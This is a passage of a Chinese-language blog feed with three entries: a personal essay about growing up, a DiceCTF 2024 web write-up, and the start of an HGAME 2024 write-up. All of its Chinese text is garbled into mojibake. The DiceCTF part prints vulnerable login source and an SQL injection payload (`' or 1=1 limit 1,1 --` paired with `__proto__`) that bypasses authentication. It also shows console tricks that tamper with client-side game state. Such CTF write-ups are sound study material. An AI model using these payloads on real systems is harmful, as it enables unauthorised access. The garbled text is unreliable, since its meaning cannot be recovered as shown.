æƒ¯æ€§çš„æ’å…¥å£è¢‹ï¼Œæ‘¸åˆ°ä¸€ä¸ªæ¯›èŒ¸èŒ¸çš„ä¸œè¥¿ï¼Œæ‹¿å‡ºæ¥ä¸€çœ‹æ‰å‘ç°æ˜¯ä¹‹å‰ç”¨è¿‡çš„å£ç½©<br>æ€€å¿µï¼Œåˆæ€ä¹ˆä¸æ€€å¿µå‘¢ï¼Ÿ<br>ç¿»ç€æ‰‹æœºç›¸å†Œï¼Œç½‘è¯¾æ—¶æœŸçš„ä¸€å¼ å¼ ç›¸ç‰‡ç‰‡åˆ»é—´å°±æŠŠé­‚å‹¾å›äº†é‚£ä¸ªå¤å¤©<br>ä½†æ˜¯æˆ‘è§‰å¾—äººä¸€è¾ˆå­å°±æ˜¯åœ¨å­¦ä¼šæ¥å—å¤±å»ï¼Œå‹æƒ…çˆ±æƒ…äº²æƒ…ï¼Œæƒ³æŠ“ä½çš„ä¸œè¥¿å¤šäº†ï¼Œæ€»æœ‰ä¸€äº›ä¼šéšé£è€Œå»ï¼Œæ•£è½åœ¨å›å¿†é‡Œï¼Œä¹Ÿè®¸åœ¨æŸä¸ªå¹³è¡Œæ—¶ç©ºä¼šæœ‰ä¸ä¸€æ ·çš„ç»“æœå§ã€‚ä½†ä¸€åˆ‡æ€»è¦ç»§ç»­ï¼Œå¶å°”æ€€å¿µä¸€ä¸‹å°±å¥½å•¦ï¼Œæœ‰äº›ä¸œè¥¿å°±åº”è¯¥è—åœ¨è®°å¿†é‡Œã€‚è™½ç„¶å§ï¼Œè¯éƒ½æ˜¯è¿™ä¹ˆè¯´ï¼Œä½†æ˜¯è½å·®æ„Ÿä¼¼ä¹æ€»æ˜¯è®©äººéš¾ä»¥æ¥å—ï¼Œä¹Ÿè®¸å¹´çºªæœªåˆ°å§<br>æŒºå¥½ç¬‘çš„ï¼Œæˆ‘ä»¥ä¸ºæˆ‘å–œæ¬¢å®‰å®‰é™é™å¬ç€å°æ­Œï¼Œç‹¬å¤„å¹²ç€è‡ªå·±çš„å°äº‹ï¼Œä½†åˆæ¥å—ä¸äº†èšä¼šç‹‚æ¬¢è¿‡åçš„è½å·®æ„Ÿã€‚<br>å°æ—¶å€™å’Œå®¶é‡Œäººå‡ºå»æ—…æ¸¸å¾ˆè®¨åŒæ‹åˆç…§ï¼Œä½†ç°åœ¨æƒ³èµ·è¯•å›¾ç¿»çœ‹ï¼Œå´æ²¡æœ‰å‡ å¼ å€¼å¾—å›å¿†çš„ç›¸ç‰‡ï¼Œå¤šå°‘æœ‰ç‚¹å¯æƒœå§<br>ä¹‹å‰çš„è‡ªå·±å¤©å¤©å‘ç–¯å‘äº›å¹¼ç¨šçš„ç©ºé—´æˆ–æœ‹å‹åœˆï¼Œç¿»çœ‹èµ·æ¥ï¼Œè™½ç„¶æœ‰äº›å°´å°¬ï¼Œä½†ç†Ÿæ‚‰çš„é…å›¾æ€»èƒ½å›å¿†èµ·ä¸å°‘ä¸œè¥¿ã€‚<br>è·ŸåŒå­¦æ‰“å®Œçƒæš´èµ°ä¿©å°æ—¶å›å®¶ã€åŒå­¦ä»¬ç»™çš„ç”Ÿæ—¥æƒŠå–œã€æ‹¼äº†ä¸‰å¹´å®Œæˆçš„æ‹¼å›¾ã€åŒå­¦ç»™æˆ‘ç¼–é€ çš„æ®µä¸€æˆç»©æ¡ã€è”è€ƒå‡ºåˆ†æ—¶è¯´ä¸å‡ºçš„å–œæ‚¦â€¦</p><div class="group-image-container"><div class="group-image-row"><div class="group-image-wrap"><img src="/posts/cf791e74/IMG_4079.JPG" alt="IMG_4079"></div><div class="group-image-wrap"><img src="/posts/cf791e74/IMG_4178.JPG" alt="IMG_4178"></div></div><div class="group-image-row"><div class="group-image-wrap"><img src="/posts/cf791e74/IMG_4072.JPG" alt="IMG_4072"></div><div class="group-image-wrap"><img src="/posts/cf791e74/IMG_4078.JPG" alt="IMG_4078"></div></div></div><p>åªå¯æƒœæˆ‘æ‹™åŠ£çš„æ–‡ç¬”å†™ä¸å‡ºå½“æ—¶çš„ç¾å¥½<br>ç¿»ç€ç¿»ç€ï¼Œå‘ç°å¤§å®¶å¥½åƒéƒ½åœ¨äººç¾¤ä¸­é€æ¸èµ°æ•£äº†ï¼ŒçŸ­ä¿ƒçš„å˜åŒ–æ€»æ˜¯æ¯”æˆ‘ä»¬æƒ³è±¡ä¸­çš„æ¥å¾—å¿«ï¼Œåªé“å½“æ—¶æ˜¯å¯»å¸¸ï¼Œ</p><p>å¾ˆå–œæ¬¢æ¸…é—²çš„å¹³æ—¥é‡Œé›¨æ»´æ¸…è„†è½åœ°çš„å£°å“ï¼Œæ€»èƒ½è®©æˆ‘æµ®èºçš„å¿ƒå¹³é™ä¸‹æ¥ï¼Œåå¿ƒæƒ…éšè½ä¸‹çš„é›¨æ°´é£˜æ•£äº†<img src="/posts/cf791e74/IMG_20230609_185405.jpg" alt="IMG_20230609_185405"></p><p>ä¸€ç›´è€ƒè™‘ç´¢è¦ä¸è¦è€ƒç ”ï¼Œè¿™å¥½åƒæ˜¯ç¬¬ä¸€æ¬¡è¦æˆ‘å†³å®šçš„å¤§äº‹ã€‚ä¸çŸ¥é“æ˜¯ä¸æ˜¯è¦å¤šè¯»ä¼šå„¿ä¹¦ï¼Œä¹Ÿè®¸æ˜¯å› ä¸ºæ€•ç´¯ï¼Œä¹Ÿè®¸æ˜¯çœ‹åˆ°ç½‘ä¸Šçš„è§†é¢‘æ€•äº†ã€‚æˆ‘å¾ˆå®³æ€•çˆ¶æ¯åˆè·Ÿæˆ‘æ‰¯ä¸€å †é“ç†ï¼Œä½†è¿‡æ¥äººçš„ç»éªŒåˆå¾€å¾€ä¸ä¼šé”™ã€‚å…¶å®ä¹ŸçŸ¥é“å·¥ä½œåŒæ ·ç”šè‡³æ›´æ¼äººï¼Œä½†å¥½åƒçœŸçš„æœ‰ç‚¹åŒå€¦äº†ä¸ºäº†æˆç»©è€Œå·ï¼Œè¿™æ ·è¯´å¥½åƒåˆæ˜¯åœ¨ä¸ºè‡ªå·±æ‘†çƒ‚æ‰¾å€Ÿå£ã€‚æœ‰æ—¶å€™å¾ˆç¾¡æ…•å¾ˆå¤šæœ‹å‹èƒ½å¤Ÿå¾ˆæ½‡æ´’ï¼Œæƒ³åšä»€ä¹ˆå°±èƒ½ä¸‹å®šå†³å¿ƒå®Œæˆï¼Œæ´»åœ¨ç‹¬å±äºè‡ªå·±çš„èˆ’é€‚åœˆé‡Œã€‚æˆ‘æ€»æ˜¯é—®ä¸ºä»€ä¹ˆäººè¦æ´»å¾—è¿™ä¹ˆç´¯å‘¢ï¼Ÿä¸ºä»€ä¹ˆå‘¢ï¼Ÿæˆ‘æä¸æ¸…æ¥šã€‚ä½†åˆå…¶å®çŸ¥é“å¦‚æœæˆ‘ä¸è¯»ç ”å°†æ¥ä¸€å®šä¼šåæ‚”ï¼Œä½†åˆ°åº•åˆä¼šæ˜¯åœ¨åæ‚”ä»€ä¹ˆã€‚<br>å…¶å®æœºä¼šä¹Ÿå¾ˆå¤šï¼Œæˆ‘æŒºå¹¸è¿çš„ï¼Œç”Ÿåœ¨ç¾å¥½çš„å®¶åº­ï¼Œæ‰€ä»¥æˆ‘çœ‹åˆ°åˆ«äººçš„åŠªåŠ›çš„æ—¶å€™ï¼Œæˆ‘ä¾¿ä¼šæƒ³æ˜¯ä¸æ˜¯æ˜¯æˆ‘èµ°äº†æ·å¾„ï¼Œè¿™æ—¶å€™æˆ‘å°±ä¼šè§‰å¾—æˆ‘æ‰€è°“çš„ç´¯æ˜¯ä¸æ˜¯åœ¨æ— ç—…å‘»åŸï¼Œæ˜¯ä¸æ˜¯æˆ‘è‡ªå·±å’ç”±è‡ªå–ï¼Œæˆ‘æ˜¯ä¸æ˜¯æ²¡æœ‰å–Šç´¯çš„èµ„æ ¼ï¼Œå¥½åƒæ˜¯åœ¨puaè‡ªå·±ï¼Œå½“ç„¶ä¹Ÿè®¸ç¤¾ä¼šæœ¬å°±ä¸å…¬å¹³ã€‚<br>å¾ˆçº ç»“ï¼Œæˆ‘ç©¶ç«Ÿåº”è¯¥ä»¥æ€æ ·çš„å§¿æ€è¿‡æˆ‘è¿™ä¸€è¾ˆå­ã€‚æœªæ¥åˆæœ‰æ— å°½çš„å˜æ•°ï¼ŒçœŸçš„æ˜¯æœ‰äº›èŒ«ç„¶ã€‚<br>ç™¾æ—¥èª“å¸ˆæ—¶å†™ç»™è€ƒåçš„è‡ªå·±çš„ä¿¡ï¼Œåˆ°ç°åœ¨ä¹Ÿè¿˜æ²¡æ‹†å¼€ï¼Œæ”¾äº†å¾ˆä¹…ï¼Œä¹Ÿè®¸å·²ç»å¼„ä¸¢äº†ï¼Œé‚£å¥æ²¡å†™å®Œçš„è¯—åªèƒ½åœ¨æ¼«æ¼«äººç”Ÿä¸­è¡¥é½äº†<br>çœ‹åˆ°ç¤¾ä¼šå†·æš–ä¹Ÿä¼šæ„ŸåŒèº«å—ï¼Œä½†åˆæ— å¯å¥ˆä½•ï¼Œäºæ˜¯ä¾¿é€æ¸éº»æœ¨ï¼Œå¥½åƒå·²ç»å˜æˆäº†ä¸€ç§è¶‹åŠ¿ã€‚<br>éƒ½è¯´äººè¦ä¸ºè‡ªå·±è€Œæ´»ï¼Œä½†åˆæ—¶å¸¸æ‰¹åˆ¤åˆ©å·±ä¸»ä¹‰ï¼Œä¹ŸçŸ¥é“è¿™ä¸¤è€…å®šä¹‰ä¸åŒï¼Œä½†æˆ‘æ€»ä¼šæƒ³æ˜¯ä¸æ˜¯è‡ªå·±æé”™äº†ä¸¤è€…çš„ç•Œé™<br>äººåœ¨ä¸åŒé˜¶æ®µå¾—æ¥å—èƒ½åŠ›æ€»æ˜¯ä¸åŒçš„ï¼Œç°åœ¨çœ‹æ¥ï¼Œä¹‹å‰çš„é‚£äº›ç ´äº‹å…¶å®ç†¬ç†¬ä¹Ÿå°±è¿‡å»äº†ï¼Œä¹Ÿè®¸æ˜¯å› ä¸ºåªè®°å¾—ç¾å¥½çš„å›å¿†å§ã€‚</p><p>ä¸€ç›´æ„Ÿè§‰æˆ‘æ˜¯ä¸€ä¸ªæ‚²è§‚ä¸»ä¹‰è€…ï¼Œè¯´ç€ä¸è¯•è¯•æ€ä¹ˆçŸ¥é“å‘¢ï¼Œå…¶å®å¿ƒé‡Œå·²ç»å¼€å§‹è€ƒè™‘plan bäº†ã€‚æ€»åœ¨ç»™åˆ«äººæä¾›è´Ÿèƒ½é‡ï¼Œæ°¸è¿œåœ¨æŠ±æ€¨ï¼Œæˆ‘å¥½åƒåšä¸æˆä¸€ä¸ªè€å¿ƒçš„å€¾å¬è€…ï¼Œå¾ˆå®¹æ˜“è¢«è‡ªå·±çš„æƒ…ç»ªå›°ä½ï¼Œæ¥ç€åˆé—´æ¥å½±å“åˆ«äººï¼Œæˆ‘å¥½åƒå°±æ˜¯æ‰¾ä¸åˆ°åˆé€‚çš„æ–¹æ³•æ¥æ¶ˆåŒ–ï¼Œæ€»ç›¼ç€æ—¶é—´æ¥æ·¡åŒ–ã€‚<br>æˆ‘å¥½åƒä»€ä¹ˆéƒ½ä¸ç¼ºï¼Œä½†åˆå¥½åƒä»€ä¹ˆéƒ½æ²¡æœ‰ï¼ŒåŒé¢‘çš„äººè¶Šæ¥è¶Šå°‘ï¼Œæœ‰äº›æƒ…ç»ªåªèƒ½å’½åœ¨è‚šå­é‡Œ<br>æˆ‘çŸ¥é“ï¼Œæœ‰å¾ˆå¤šäººåº”è¯¥å¯¹æˆ‘æœ‰ä¸åŒçš„çœ‹æ³•å’Œæ„è§ï¼Œæˆ‘å½“ç„¶å°Šé‡ï¼Œæ¯•ç«Ÿäººä¸äººä¹‹é—´è§†è§’æ˜¯ä¸åŒçš„ã€‚æ‰€ä»¥åœ¨å¤§éƒ¨åˆ†æƒ…å†µä¸‹ï¼Œæˆ‘ä¸å¤ªæ„¿æ„è¿‡å¤šåœ°å±•ç¤ºè‡ªå·±çœŸå®çš„æƒ…ç»ªï¼Œä½†åˆå¸Œæœ›æœ‰äººèƒ½ç†è§£æˆ‘ï¼Œåˆå®³æ€•åˆ«äººçœ‹ç©¿æˆ‘ï¼Œæˆ‘å…¶å®æè¿°ä¸å‡ºæˆ‘çš„æƒ…ç»ªï¼Œæˆ‘å¿ƒé‡Œå°±æ˜¯æœ‰äº‹ï¼Œä½†æˆ‘å°±æ˜¯ä¸æƒ³è·Ÿåˆ«äººè¯´èµ·ï¼Œä»¥è‡³äºæœ‰æ—¶å€™åˆ†ä¸æ¸…æˆ‘åˆ°åº•æ˜¯ä¸æ˜¯å‘è‡ªå†…å¿ƒçš„å¿«ä¹ã€‚æˆ‘ä¹Ÿè®¸ä¸€å¤©å¤©å‘ä¸å®Œçš„æœ‹å‹åœˆï¼Œå‘ä¸å®Œçš„ç–¯ï¼Œä½†æ€»è§‰è‡ªå·±ç©ºè™šï¼Œæ€»æ˜¯å¼ºè£…ç²¾ç¥ï¼ŒæŠŠè‡ªå·±çš„æƒ…ç»ªé”èµ·æ¥ã€‚æ€»è¯´ç€è¦ç§¯æä¹è§‚ï¼Œä½†çƒ¦å¿ƒäº‹å´æ€»ä¸ç»™ä½ æ¶ˆåœçš„æœºä¼š<br>å®³æ€•çƒ­æƒ…è¢«ç°å®ç£¨ç­ï¼Œç»šçƒ‚çš„å¹»æƒ³éšåŒ¿äºå°˜åŸƒï¼Œæ€»æœŸç›¼ç€æœªæ¥çš„å¯èƒ½ï¼Œä¹Ÿæƒ³ä¸€è¾ˆå­å°±å¹²è‡ªå·±å–œæ¬¢çš„äº‹ï¼Œä½†è¶Šå¤§è¶Šå‘ç°ç†æƒ³ä¸»ä¹‰çš„èŠ±æ°¸è¿œä¸ä¼šå¼€åœ¨ç°å®ä¸»ä¹‰çš„åœŸå£¤ä¸­ï¼ŒæŒ¥éœçš„é’æ˜¥æ€»æœ‰ç»“æŸçš„ä¸€å¤©ï¼ŒçŸ³å¤´æœ€åä¹Ÿè¿˜æ˜¯æ²¡èƒ½å†²ç ´å¸ƒ<br>â€œæˆ‘ä»¬ä¸€è·¯èµ°æ¥çš„é£æ™¯å¾ˆç¾ï¼Œå°±åªå·®äº†ä¸€æ­¥â€</p><div class="group-image-container"><div class="group-image-row"><div class="group-image-wrap"><img src="/posts/cf791e74/retouch_2022081318204848.jpg" alt="retouch_2022081318204848"></div><div class="group-image-wrap"><img src="/posts/cf791e74/IMG_1903.JPG" alt="IMG_1903"></div></div></div><p>å¾ˆä¹…æ²¡æœ‰æƒ¬æ„çš„ååœ¨ä¸€ä¸ªåœ°æ–¹å‘å‘†äº†ï¼Œå¶ç„¶æŠ¬å¤´æœ›å‘çª—å¤–çš„å¤©ç©ºï¼Œè„‘æµ·é‡Œæµ®ç°çš„å´æ˜¯ä¸­å­¦æ—¶æœŸçš„æ·¡ç²‰è‰²æ™šéœã€‚å†™ç€ä½œä¸šï¼Œé—²æ—¶æŠ¬èµ·å¤´ï¼Œä¸ç»æ„é—´çš„ç¾å¥½ï¼Œå¿ƒä¸­æ„Ÿå¹ï¼Œä¸å¤šæ—¶åˆå†æ¬¡ä½å¤´ï¼Œè‡ªç„¶å´åˆç‰¹åˆ«çš„æ»‹å‘³</p><div class="group-image-container"><div class="group-image-row"><div class="group-image-wrap"><img src="/posts/cf791e74/IMG_4175.JPG" alt="IMG_4175"></div><div class="group-image-wrap"><img src="/posts/cf791e74/IMG_3982.JPG" alt="IMG_3982"></div></div><div class="group-image-row"><div class="group-image-wrap"><img src="/posts/cf791e74/IMG_4177.JPG" alt="IMG_4177"></div></div></div><p>æ›¾ç»å¹»æƒ³ä¸­åº”å½“é£åæ­£èŒ‚çš„18å²ä¹Ÿå³å°†èµ°åˆ°äº†å°½å¤´ï¼Œå°æ—¶å€™æ€»è§‰ç€äººç”Ÿå°±åƒæ˜¯ä¸ªå¤§å‹æ¸¸æˆï¼Œæ¯å¤©å°±æ˜¯åˆ·åˆ·å‰¯æœ¬ï¼Œæ­»äº†å°±é‡æ¥å‘—ï¼Œæœ‰ä»€ä¹ˆå¤§ä¸äº†ï¼Œä½†ç°åœ¨çœ‹æ¥å¥½åƒä¹Ÿä¸æ˜¯ä¸€å›äº‹äº†ã€‚äººç”Ÿè·¯ä¹Ÿè¿˜é•¿å‘¢ï¼Œæœ€åè¿˜æ˜¯å¸Œæœ›è‡ªå·±èƒ½æˆä¸ºå„¿æ—¶å£ä¸­è‡ªç”±æ´’è„±çš„äººï¼Œèƒ½æ‹¾å›é‚£æ—¶æ— é™çš„çƒ­å¿±ï¼Œä¿æŒå¯¹æ–°é²œäº‹ç‰©çš„å¥½å¥‡ï¼Œç¥å¹³å®‰å–œä¹ï¼Œå¤©å¤©å¼€å¿ƒ</p><p>æ²¡ä»€ä¹ˆæ–‡é‡‡ï¼Œå†™ä¸å‡ºæ·±æ²‰è¯—æ„çš„å¥å­ï¼Œç†Ÿæ‚‰æˆ‘çš„æœ‹å‹åº”è¯¥éƒ½çŸ¥é“å†™ä½œå‘æ¥æ˜¯æˆ‘æœ€ä¸æ“…é•¿çš„äº‹ï¼Œä½†æ˜¯å†™çš„æ€ä¹ˆæ ·é™¤äº†æˆ‘åˆæœ‰è°ä¼šåœ¨æ„å‘¢ã€‚è™½ç„¶ä½†æ˜¯ï¼Œå¤šå¹´ä»¥åï¼Œä¼°è®¡æˆ‘è‡ªå·±ä¹Ÿä¼šè§‰å¾—è‡ªå·±â€œä¸ºèµ‹æ–°è¯å¼ºè¯´æ„â€å§ï¼Œæ¯•ç«Ÿè°è®©â€œæ—©å²é‚£çŸ¥ä¸–äº‹è‰°â€å‘¢ğŸ˜›ğŸ˜›<img src="/posts/cf791e74/102612.jpg"></p><center><font size="6">æœ‹å‹å•Šï¼Œæˆ‘ä»¬éƒ½é•¿å¤§äº†</font></center>]]></content>
    
    
    <categories>
      
      <category>life</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Summary</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DiceCtf 2024 Quals Web WriteUps</title>
    <link href="/posts/3f2e31d4/"/>
    <url>/posts/3f2e31d4/</url>
    
    <content type="html"><![CDATA[<h1 id="dicedicegoose"><a href="#dicedicegoose" class="headerlink" title="dicedicegoose"></a>dicedicegoose</h1><p><img src="/posts/3f2e31d4/image-20240205152407464.png" alt="image-20240205152407464">F12å®¡è®¡æºç ï¼Œ</p><p><img src="/posts/3f2e31d4/image-20240205152114668.png" alt="image-20240205152114668"></p><p><img src="/posts/3f2e31d4/image-20240205152158905.png" alt="image-20240205152158905"></p><p>ç®€å•ç†è§£ä¸€ä¸‹ï¼Œå°±æ˜¯ history æ•°ç»„é•¿åº¦è¦ä¸º9ï¼Œä¹Ÿå°±æ˜¯åªèƒ½èµ°9æ­¥ï¼ˆéª°å­å¾€ä¸‹ï¼Œé»‘å—å¾€å·¦</p><p>å› ä¸ºé»‘è‰²æ˜¯éšæœºæ–¹å‘èµ°ï¼Œæ‰€ä»¥æˆ‘ä»¬æ‰“å¼€æ§åˆ¶å°ï¼Œç›´æ¥ä¿®æ”¹ history ä¸­é»‘è‰²çš„ä½ç½®å†å²å°±è¡Œ</p><p>å…ˆè‡ªå·±èµ°8æ­¥</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js">i=<span class="hljs-number">9</span>;history.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">innerArray</span> =&gt;</span> &#123;<br>    innerArray[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] = i--;<br>    innerArray[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">9</span>;<br>&#125;);<br></code></pre></td></tr></table></figure><p><img src="/posts/3f2e31d4/image-20240205153610723.png" alt="image-20240205153610723"></p><h1 id="funnylogin"><a href="#funnylogin" class="headerlink" title="funnylogin"></a>funnylogin</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);<br><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br><br><span class="hljs-keyword">const</span> db = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;better-sqlite3&#x27;</span>)(<span class="hljs-string">&#x27;db.sqlite3&#x27;</span>);<br>db.<span class="hljs-title function_">exec</span>(<span class="hljs-string">`DROP TABLE IF EXISTS users;`</span>);<br>db.<span class="hljs-title function_">exec</span>(<span class="hljs-string">`CREATE TABLE users(</span><br><span class="hljs-string">    id INTEGER PRIMARY KEY,</span><br><span class="hljs-string">    username TEXT,</span><br><span class="hljs-string">    password TEXT</span><br><span class="hljs-string">);`</span>);<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">FLAG</span> = process.<span class="hljs-property">env</span>.<span class="hljs-property">FLAG</span> || <span class="hljs-string">&quot;dice&#123;test_flag&#125;&quot;</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">PORT</span> = process.<span class="hljs-property">env</span>.<span class="hljs-property">PORT</span> || <span class="hljs-number">3000</span>;<br><br><span class="hljs-keyword">const</span> users = [...<span class="hljs-title class_">Array</span>(<span class="hljs-number">100_000</span>)].<span class="hljs-title function_">map</span>(<span class="hljs-function">() =&gt;</span> (&#123; <span class="hljs-attr">user</span>: <span class="hljs-string">`user-<span class="hljs-subst">$&#123;crypto.randomUUID()&#125;</span>`</span>, <span class="hljs-attr">pass</span>: crypto.<span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">8</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&quot;hex&quot;</span>) &#125;));<br>db.<span class="hljs-title function_">exec</span>(<span class="hljs-string">`INSERT INTO users (id, username, password) VALUES <span class="hljs-subst">$&#123;users.map((u,i) =&gt; <span class="hljs-string">`(<span class="hljs-subst">$&#123;i&#125;</span>, &#x27;<span class="hljs-subst">$&#123;u.user&#125;</span>&#x27;, &#x27;<span class="hljs-subst">$&#123;u.pass&#125;</span>&#x27;)`</span>).join(<span class="hljs-string">&quot;, &quot;</span>)&#125;</span>`</span>);<br><br><span class="hljs-keyword">const</span> isAdmin = &#123;&#125;;<br><span class="hljs-keyword">const</span> newAdmin = users[<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * users.<span class="hljs-property">length</span>)];<br>isAdmin[newAdmin.<span class="hljs-property">user</span>] = <span class="hljs-literal">true</span>;<br><br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">urlencoded</span>(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">false</span> &#125;));<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(<span class="hljs-string">&quot;public&quot;</span>));<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/api/login&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> &#123; user, pass &#125; = req.<span class="hljs-property">body</span>;<br><br>    <span class="hljs-keyword">const</span> query = <span class="hljs-string">`SELECT id FROM users WHERE username = &#x27;<span class="hljs-subst">$&#123;user&#125;</span>&#x27; AND password = &#x27;<span class="hljs-subst">$&#123;pass&#125;</span>&#x27;;`</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">const</span> id = db.<span class="hljs-title function_">prepare</span>(query).<span class="hljs-title function_">get</span>()?.<span class="hljs-property">id</span>;<br>        <span class="hljs-keyword">if</span> (!id) &#123;<br>            <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&quot;/?message=Incorrect username or password&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (users[id] &amp;&amp; isAdmin[user]) &#123;<br>            <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&quot;/?flag=&quot;</span> + <span class="hljs-built_in">encodeURIComponent</span>(<span class="hljs-variable constant_">FLAG</span>));<br>        &#125;<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&quot;/?message=This system is currently only available to admins...&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">catch</span> &#123;<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&quot;/?message=Nice try...&quot;</span>);<br>    &#125;<br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-variable constant_">PORT</span>, <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`web/funnylogin listening on port <span class="hljs-subst">$&#123;PORT&#125;</span>`</span>));<br></code></pre></td></tr></table></figure><p><img src="/posts/3f2e31d4/image-20240205154302333.png" alt="image-20240205154302333"></p><p>å¾ˆæ˜æ˜¾éœ€è¦sqlæ³¨å…¥ï¼Œ</p><p><code>1&#39; or 1=1 limit 1,1 --</code></p><p>æ¯”è¾ƒç»†çš„ç‚¹ï¼Œæ–‡ä»¶å¼€å¤´ç”Ÿæˆçš„ id æ˜¯ä»0å¼€å§‹çš„ï¼Œæ‰€ä»¥éœ€è¦ <code>limit 1,1</code></p><p>ç¬¬äºŒä¸ªæ¡ä»¶éœ€è¦ <code>users[id]</code> å’Œ <code>isAdmin[user]</code> ï¼Œæ²¡æœ‰å›æ˜¾ï¼Œæ‰€ä»¥æ²¡åŠæ³•å¾—çŸ¥å…·ä½“userå</p><p>è¿™é‡Œä½¿ç”¨<code>__proto__</code>å’Œ <code>1&#39; or 1=1 limit 1,1 --</code>æ­é…ç»•è¿‡</p><p><img src="/posts/3f2e31d4/image-20240205154921931.png" alt="image-20240205154921931"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HGAME 2024 WEEK-1 WriteUps</title>
    <link href="/posts/b4162f1f/"/>
    <url>/posts/b4162f1f/</url>
    
    <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="2048-16"><a href="#2048-16" class="headerlink" title="2048*16"></a>2048*16</h2><p><img src="/posts/b4162f1f/image-20240204201811023.png" alt="image-20240204201811023"></p><p>å®¡è®¡æºç å¯ä»¥çœ‹åˆ°å¯ç–‘ç‚¹</p><p><img src="/posts/b4162f1f/image-20240204201951012.png" alt="image-20240204201951012"></p><p>è¿›è¡Œå•æ­¥è°ƒè¯•ï¼Œè·³åˆ° js ç•Œé¢<img src="/posts/b4162f1f/image-20240204202044429.png" alt="image-20240204202044429"></p><p>æ­¤æ—¶å°±å¯ä»¥è¿›å…¥æ§åˆ¶å°æŸ¥çœ‹å¯ç–‘ä»£ç </p><p><code>n=h</code> æ‰€ä»¥æˆ‘ä»¬çœ‹çœ‹ <code>h</code> æ˜¯ä»€ä¹ˆ</p><p><img src="/posts/b4162f1f/image-20240204202227589.png" alt="image-20240204202227589"></p><p>å‘ç°æŒ‡å‘ <code>F</code> ï¼Œç›´æ¥ä¼ å‚è¯•è¯•</p><p>å¾—åˆ°</p><p><img src="/posts/b4162f1f/image-20240204202324117.png" alt="image-20240204202324117"></p><p>ç›´æ¥è°ƒç”¨ <code>s0</code> çœ‹çœ‹</p><p><img src="/posts/b4162f1f/image-20240204202418513.png" alt="image-20240204202418513"></p><p>ç»“æŸ</p><p><em><strong><center><font color="#81ecec" size="6"><code>flag&#123;b99b820f-934d-44d4-93df-41361df7df2d&#125;</code></font></center></strong></em></p><h2 id="Bypass-it"><a href="#Bypass-it" class="headerlink" title="Bypass it"></a>Bypass it</h2><p>æç¤ºéœ€è¦ç™»å½•ï¼Œæ²¡æœ‰è´¦æˆ·æ‰€ä»¥éœ€è¦æ³¨å†Œ</p><p>ç‚¹å‡»å¼¹ <code>alert</code> æ ¹æ®æç¤º <code>This page requires javascript to be enabled :)</code></p><p>æŠŠæµè§ˆå™¨ <code>ç¦ç”¨Javascript</code> å¼€äº†å°±è¡Œ</p><p>è¿›æ³¨å†Œç•Œé¢æ³¨å†Œä¸ªå·å†ç™»å½•å°±è¡Œï¼Œç™»å½•è®°å¾—æŠŠ <code>ç¦ç”¨Javascript</code> 